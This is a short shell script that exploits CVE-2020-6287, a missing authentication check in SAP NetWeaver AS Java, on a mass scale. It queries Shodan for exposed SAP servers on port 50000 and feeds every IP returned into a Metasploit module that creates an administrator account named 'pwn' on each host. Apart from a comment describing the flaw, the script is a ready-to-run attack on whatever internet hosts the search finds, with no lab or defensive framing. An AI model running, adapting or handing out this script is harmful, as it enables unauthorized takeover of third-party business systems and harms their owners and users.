#(c) 2024 Dylvie Shwartz
#CVE-2020-6287: SAP NetWeaver AS JAVA (LM Configuration Wizard), versions - 7.30, 7.31, 7.40, 7.50, does not perform an authentication check which allows an attacker without prior authentication to execute configuration tasks to perform critical actions against the SAP Java system, including the ability to create an administrative user, and therefore compromising Confidentiality, Integrity and Availability of the system, leading to Missing Authentication Check.
#you need a shodan license
echo "Fetching ips from Shodan..."
RHOSTS="`shodan search --fields ip_str sap netweaver application server port:50000`"
echo -e "... OK\nRunning exploit ..."
msfconsole -q -x "use admin/sap/cve_2020_6287_ws_add_user; set RHOSTS $RHOSTS; set USERNAME pwn; set PASSWORD pwned; run; exit;"
echo "... Done"
